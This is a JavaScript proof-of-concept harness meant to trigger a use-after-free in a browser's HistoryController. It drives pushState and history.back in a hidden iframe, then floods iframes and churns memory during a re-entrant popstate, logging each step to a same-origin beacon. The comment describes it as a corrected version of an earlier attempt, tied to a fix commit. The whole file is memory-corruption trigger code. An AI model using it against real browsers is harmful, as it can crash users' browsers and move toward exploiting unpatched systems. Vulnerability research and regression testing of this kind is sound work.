// c025b: HistoryController UAF via re-entrant popstate (fix efe49205) - harness fixed.
//
// c025 never reached the interesting code: onload was assigned after the iframe was appended with src already
// set, so the load event fired into nothing and the popstate path never ran. Handler is attached first here,
// and the history drive happens in the child frame so the Guide's own page is not navigated away.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c025b-' + t); } catch (e) {} }
  send('boot');

  function churn() {
    if (typeof GCController !== 'undefined') { GCController.collect(); return; }
    for (var i = 0; i < 6000; i++) { var s = new String('A'.repeat(4000)); }
  }

  var f = document.createElement('iframe');
  f.style.display = 'none';

  f.onload = function () {
    send('loaded');
    var w = null;
    try { w = f.contentWindow; } catch (e) { send('cw-threw:' + e.name); return; }
    if (!w) { send('no-contentwindow'); return; }
    try {
      w.addEventListener('popstate', function () {
        for (var i = 0; i < 40; i++) {
          var g = document.createElement('iframe');
          g.src = 'about:blank';
          document.body.appendChild(g);
        }
        churn();
        send('popstate-ran');
      }, { once: true });

      w.history.pushState({ k: 1 }, '', '#x');
      send('pushed');
      setTimeout(function () {
        try { w.history.back(); send('back-called'); }
        catch (e) { send('back-threw:' + e.name); }
      }, 50);
    } catch (e) { send('setup-threw:' + e.name); }
  };

  f.src = 'about:blank';
  document.body.appendChild(f);
  send('iframe-added');

  setTimeout(function () { send('survived'); }, 3000);
})();
